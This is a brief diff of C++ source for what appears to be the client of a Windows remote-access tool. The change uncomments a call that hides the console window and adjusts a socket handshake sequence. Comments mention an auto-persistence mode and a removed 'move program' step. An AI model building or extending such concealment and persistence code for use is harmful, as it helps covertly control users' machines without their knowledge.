@@ -6,10 +6,11 @@
 int main()
 {
     //-lws2_32
-    //ShowWindow(GetConsoleWindow(),SW_HIDE);
+    ShowWindow(GetConsoleWindow(),SW_HIDE);
 
-    Connexion Client; //Declaration de l'object
+    Connexion Client; 
     HandShake Handshake;
+    
 
     //bool auto_persistence = false; //allows you to know if the auto persistence mode is active or not.
 
@@ -18,15 +19,9 @@ int main()
 
 
     cout << "Start connexion in startHandShake." << endl;
-    cout << "[+] move prog go" << endl;
-    if(AUTO_MOVE)
-    {
-        Handshake.moveProg();
-        cout << "[+] move prog finish" << endl;
-    }
-    
 
     Handshake.setSock(Client.getSocket());
+    Handshake.beforeHandShake();
     Handshake.startHandShake();    
     cout << "[+] Handshake finished..." << endl;
     
